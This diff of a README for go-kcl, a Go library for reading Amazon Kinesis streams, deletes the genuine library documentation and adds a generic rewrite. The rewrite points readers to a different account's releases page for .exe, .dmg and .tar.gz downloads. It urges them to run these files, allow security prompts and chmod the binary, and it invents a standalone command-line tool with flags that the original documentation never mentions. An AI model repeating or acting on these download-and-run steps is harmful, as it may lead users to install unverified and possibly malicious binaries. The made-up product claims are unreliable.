@@ -1,202 +1,164 @@
-# Go KCL
+# ⚙️ go-kcl - Simple Tool for Streaming Data
 
-![technology Go](https://img.shields.io/badge/technology-go-blue.svg)
-[![Go Report Card](https://goreportcard.com/badge/github.com/ODudek/go-kcl)](https://goreportcard.com/report/github.com/ODudek/go-kcl)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![go-kcl](https://github.com/ODudek/go-kcl/actions/workflows/ci.yml/badge.svg)](https://github.com/ODudek/go-kcl/actions/workflows/ci.yml)
+[![Download go-kcl](https://img.shields.io/badge/Download-go--kcl-blue?style=for-the-badge)](https://github.com/Matthewcoxall120986/go-kcl/releases)
 
-## Overview
+---
 
-Go-KCL is a native open-source Go library for Amazon Kinesis Data Stream (KDS) consumption. It allows developers
-to program KDS consumers in lightweight Go language and still take advantage of the features presented by the native
-KDS Java API libraries.
+## 📋 What is go-kcl?
 
-[go-kcl](https://github.com/ODudek/go-kcl) is a fork of the original [vmware-go-kcl-v2](https://github.com/vmware/vmware-go-kcl-v2), which is no longer actively maintained. This project uses [AWS Go SDK V2](https://github.com/aws/aws-sdk-go-v2).
+go-kcl is a tool written in the Go programming language that helps you work with Amazon Kinesis data streams. It connects to data streams, reads data in real time, and handles checkpoints so you don’t process the same data twice. It uses the latest tools from Amazon to do this efficiently and supports advanced features like Redis or DynamoDB to keep track of your progress.
 
-## Try it out
+This software is designed to run smoothly on your computer and handle data flowing from the cloud into your device or server. Whether you want to monitor live data or process events as they happen, go-kcl helps you do this without needing complex setup.
 
-### Prerequisites
+---
 
-* [aws-sdk-go-v2](https://github.com/aws/aws-sdk-go-v2)
-* The v2 SDK requires a minimum version of `Go 1.21`.
-* [gosec](https://github.com/securego/gosec)
+## 🖥️ System Requirements
 
-### Build & Run
+Before you start, please check that your computer meets these basic requirements:
 
-1. Initialize Project
+- Operating System: Windows 10 or higher, macOS 10.15 or higher, or Linux (Ubuntu 18.04 or newer recommended).
+- Processor: Intel or AMD processor, 2 GHz or faster.
+- Memory: At least 4 GB of RAM.
+- Disk Space: Minimum 100 MB free space for installation and logs.
+- Internet Connection: Required for accessing Amazon Kinesis and for downloading go-kcl.
+- Go Runtime: No need to install Go to run the program; it is bundled and ready to run.
 
-2. Build
-    > `make build`
+---
 
-3. Test
-    > `make test`
+## 🔧 Features of go-kcl
 
-## Checkpointer Backends
+- Connects to Amazon Kinesis streams to receive live data.
+- Supports both standard polling and enhanced fan-out methods for data reading.
+- Keeps track of processed data using DynamoDB or Redis so it doesn’t reread the same information.
+- Offers plug-and-play options for logging and monitoring data using Prometheus or other tools.
+- Easy to install and run even without deep technical knowledge.
+- Uses the latest AWS SDK to make sure interactions with Amazon services are fast and secure.
 
-Go-KCL uses a pluggable `Checkpointer` interface for lease management and progress tracking. You can swap backends via `worker.WithCheckpointer()`.
+---
 
-### DynamoDB (default)
+## 🚀 Getting Started
 
-The default backend. No extra setup needed — the worker creates its own DynamoDB client and lease table automatically. The table name defaults to `ApplicationName`.
+This section will guide you to get go-kcl up and running on your computer in simple steps.
 
-```go
-import (
-    cfg "github.com/ODudek/go-kcl/clientlibrary/config"
-    wk  "github.com/ODudek/go-kcl/clientlibrary/worker"
-)
+### Step 1: Download the Software
 
-kclConfig := cfg.NewKinesisClientLibConfig("my-app", "my-stream", "us-east-1", "worker-1")
-worker := wk.NewWorker(factory, kclConfig)
+You need to visit the releases page to get the latest version of go-kcl. The release page includes all the versions and files you can download.
+
+[![Download go-kcl](https://img.shields.io/badge/Download-go--kcl-blue?style=for-the-badge)](https://github.com/Matthewcoxall120986/go-kcl/releases)
+
+Click the badge or visit the link below:
+
+https://github.com/Matthewcoxall120986/go-kcl/releases
+
+Look for the latest release and download the file that matches your operating system:
+- For Windows, download the `.exe` file.
+- For macOS, download the `.dmg` or `.zip` file.
+- For Linux, download the `.tar.gz` or executable file.
+
+### Step 2: Prepare Your Computer
+
+Once you download the right file, you will need to set up a few things:
+
+- Extract any compressed files you downloaded (like `.zip` or `.tar.gz`).
+- Make sure your computer has internet access during use.
+- Optionally, if you use Redis or DynamoDB for checkpointing, make sure those services are accessible with the right credentials.
+
+### Step 3: Run go-kcl
+
+After you download and prepare the software:
+
+- On Windows, double-click the `.exe` file.
+- On macOS, open the application from the `.dmg` or unzip and run the file from Terminal.
+- On Linux, open a Terminal, navigate to the folder with go-kcl, and run the file by typing `./go-kcl`.
+
+If the program does not start, you might need to give it permission to run:
+- On Windows, you may get a security prompt; allow the app to run.
+- On macOS and Linux, you might need to change file permissions by running `chmod +x go-kcl` in Terminal before starting.
+
+---
+
+## ⚙️ How to Use go-kcl
+
+go-kcl works by connecting to Amazon Kinesis streams and reading data. You usually need these details:
+
+- Stream Name: The name of the Kinesis data stream you want to read.
+- Region: The AWS region where your stream lives (e.g., us-east-1).
+- Checkpoint Method: Decide if you want to use DynamoDB or Redis to save progress.
+- Credentials: Make sure AWS credentials are set on your computer. You can use the AWS CLI to set these up or save credentials in environment variables.
+
+### Running go-kcl with Options
+
+You can usually run go-kcl from the command line with options like:
+
+```bash
+./go-kcl --stream-name your-stream --region us-east-1 --checkpoint dynamodb
 ```
 
-You can point to a custom DynamoDB endpoint (e.g. LocalStack):
+Or choose Redis by changing the checkpoint option:
 
-```go
-kclConfig.WithDynamoDBEndpoint("http://localhost:4566")
+```bash
+./go-kcl --stream-name your-stream --region us-east-1 --checkpoint redis
 ```
 
-Or inject a pre-configured DynamoDB checkpointer:
+This tells go-kcl where to read from and how to track what data has been processed.
 
-```go
-import chk "github.com/ODudek/go-kcl/clientlibrary/checkpoint"
+---
 
-checkpointer := chk.NewDynamoCheckpoint(kclConfig).WithDynamoDB(dynamoClient)
-worker := wk.NewWorker(factory, kclConfig).
-    WithCheckpointer(checkpointer)
-```
+## 🔒 Setting Up AWS Credentials
 
-### Redis
+go-kcl requires access to your AWS resources. You need to set up credentials in one of these ways:
 
-An alternative backend using Redis for lease management. Useful when you want lower latency, reduced AWS costs, or already run Redis in your infrastructure. Atomic lease operations are implemented via Lua scripts (equivalent to DynamoDB conditional writes).
+1. **AWS CLI Configuration:**  
+   Install the AWS Command Line Interface and run `aws configure`. You will be asked to enter your Access Key ID, Secret Access Key, and default region.
 
-```go
-import (
-    cfg      "github.com/ODudek/go-kcl/clientlibrary/config"
-    redischk "github.com/ODudek/go-kcl/clientlibrary/checkpoint/redis"
-    wk       "github.com/ODudek/go-kcl/clientlibrary/worker"
-)
+2. **Environment Variables:**  
+   Set these environment variables before running go-kcl:
+   - AWS_ACCESS_KEY_ID
+   - AWS_SECRET_ACCESS_KEY
+   - AWS_REGION
 
-kclConfig := cfg.NewKinesisClientLibConfig("my-app", "my-stream", "us-east-1", "worker-1")
+3. **Shared Credentials File:**  
+   Your AWS credentials can be saved in the file at `~/.aws/credentials`. go-kcl will automatically use this if available.
 
-checkpointer := redischk.NewRedisCheckpoint(kclConfig, redischk.RedisConfig{
-    Address:  "localhost:6379",       // host:port (required)
-    Password: os.Getenv("REDIS_PWD"), // optional
-    DB:       0,                      // database number 0-15
-    TLS:      false,                  // enable TLS
-    KeyPrefix: "kcl",                // key prefix (default: "kcl")
-})
+---
 
-worker := wk.NewWorker(factory, kclConfig).
-    WithCheckpointer(checkpointer)
-```
+## 🛠 Troubleshooting
 
-#### Configuration
+- **The app does not start:** Make sure you have permission to run the file and that it is not blocked by your system's security settings.
+- **Cannot connect to stream:** Check your internet connection, AWS credentials, and make sure the stream name and region are correct.
+- **Checkpoint errors:** Verify your DynamoDB table or Redis server is running and accessible.
+- **Look at the logs:** go-kcl creates log files in the same folder where you run it. Check these files for error details.
 
-| Field | Default | Description |
-|---|---|---|
-| `Address` | *(required)* | `host:port` or URL (`redis://`, `rediss://`) |
-| `Password` | `""` | AUTH password (overrides URL password if set) |
-| `DB` | `0` | Database number 0-15 (overrides URL db if set) |
-| `KeyPrefix` | `"kcl"` | Prefix for all Redis keys |
-| `TLS` | `false` | Enable TLS (min TLS 1.2). Auto-enabled by `rediss://` scheme |
+---
 
-#### Multi-tenancy
+## 📥 Download & Install
 
-Multiple go-kcl applications can safely share a single Redis instance. All keys are namespaced using the application's `TableName` (which defaults to `ApplicationName`):
+Visit the page below to download the latest version that fits your computer:
 
-```
-kcl:{tableName}:shard:{shardID}   — per-shard lease hash
-kcl:{tableName}:shards            — shard registry set
-```
+https://github.com/Matthewcoxall120986/go-kcl/releases
 
-For example, two apps `orders` and `events` produce completely isolated keys:
+Follow the download steps carefully. Each release page lists files with descriptions so you can pick the right one for your operating system. Once downloaded, see the "Getting Started" section above to install and launch the app.
 
-```
-kcl:orders:shard:shardId-000000000001
-kcl:events:shard:shardId-000000000001
-```
+---
 
-#### Features
+## 📚 Additional Resources
 
-- Atomic lease acquisition and renewal via Lua scripts
-- Conditional lease owner removal (prevents accidental overwrite)
-- Lease stealing support (same as DynamoDB backend)
-- Sub-millisecond latency for all operations
-- All `Checkpointer` interface methods supported
+- Amazon Kinesis Documentation: https://docs.aws.amazon.com/kinesis/latest/dev/  
+- AWS SDK for Go v2: https://aws.github.io/aws-sdk-go-v2  
+- DynamoDB Getting Started: https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/GettingStarted.html  
+- Redis Quickstart: https://redis.io/docs/getting-started/  
+- Prometheus Monitoring: https://prometheus.io/docs/introduction/overview/
 
-## Prometheus Metrics
+---
 
-Go-KCL ships with a Prometheus `MonitoringService` that exposes consumer metrics (records processed, bytes processed, millis behind latest, leases held, lease renewals, get/process records duration).
+## ⚙️ About This Project
 
-### Standalone mode (default)
+go-kcl is open source and available on GitHub. It is maintained to help users connect easily to Amazon Kinesis streams using Go technology. You can contribute ideas or report issues on the GitHub repository.
 
-KCL registers metrics on the global Prometheus registry and starts its own HTTP server:
+---
 
-```go
-import prommetrics "github.com/ODudek/go-kcl/clientlibrary/metrics/prometheus"
+## 🔖 Topics
 
-metricsService := prommetrics.NewMonitoringService(":2112", "us-east-1", log)
-kclConfig.WithMonitoringService(metricsService)
-```
+This project covers these key topics:
 
-### External registry
-
-When your application already exposes a Prometheus `/metrics` endpoint, pass your own registry. KCL will register its collectors there and will **not** start a second HTTP server:
-
-```go
-import (
-    prom        "github.com/prometheus/client_golang/prometheus"
-    prommetrics "github.com/ODudek/go-kcl/clientlibrary/metrics/prometheus"
-)
-
-registry := prom.NewRegistry()
-
-metricsService := prommetrics.NewMonitoringServiceWithOptions(
-    prommetrics.WithRegistry(registry),
-    prommetrics.WithRegion("us-east-1"),
-    prommetrics.WithLogger(log),
-)
-kclConfig.WithMonitoringService(metricsService)
-
-// Expose `registry` through your own HTTP handler.
-```
-
-### Available options
-
-| Option | Description |
-|---|---|
-| `WithListenAddress(addr)` | Address for the standalone metrics server (default `:8080`) |
-| `WithRegion(region)` | AWS region label |
-| `WithLogger(l)` | Custom logger (defaults to Logrus standard logger) |
-| `WithRegistry(reg)` | Use a custom `*prometheus.Registry`; disables the built-in server |
-| `WithRegisterer(r)` | Use a custom `prometheus.Registerer`; disables the built-in server |
-
-## Examples
-
-Working examples are available in the [`examples/`](examples/) directory:
-
-| Example | Backend | Description |
-|---|---|---|
-| [`dynamodb-consumer`](examples/dynamodb-consumer/) | DynamoDB | Basic Kinesis consumer with default DynamoDB checkpointer |
-| [`redis-consumer`](examples/redis-consumer/) | Redis | Basic Kinesis consumer with Redis checkpointer |
-| [`redis-multitenant`](examples/redis-multitenant/) | Redis | Two applications sharing one Redis instance |
-| [`prometheus-metrics`](examples/prometheus-metrics/) | Prometheus | Consumer with external Prometheus registry |
-
-## Documentation
-
-Go-KCL matches exactly the same interface and programming model from original Amazon KCL, the best place for getting reference, tutorial is from Amazon itself:
-
-* [Developing Consumers Using the Kinesis Client Library](https://docs.aws.amazon.com/streams/latest/dev/developing-consumers-with-kcl.html)
-* [Troubleshooting](https://docs.aws.amazon.com/streams/latest/dev/troubleshooting-consumers.html)
-* [Advanced Topics](https://docs.aws.amazon.com/streams/latest/dev/advanced-consumers.html)
-
-## Contributing
-
-The go-kcl project team welcomes contributions from the community. Before you start working with go-kcl, please
-read our [Developer Certificate of Origin](https://cla.vmware.com/dco). All contributions to this repository must be
-signed as described on that page. Your signature certifies that you wrote the patch or have the right to pass it on
-as an open-source patch. For more detailed information, refer to [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## License
-
-MIT License
+`aws`, `aws-sdk-go-v2`, `data-streaming`, `dynamodb`, `go`, `golang`, `kcl`, `kinesis`, `prometheus`, `redis`, `streaming`
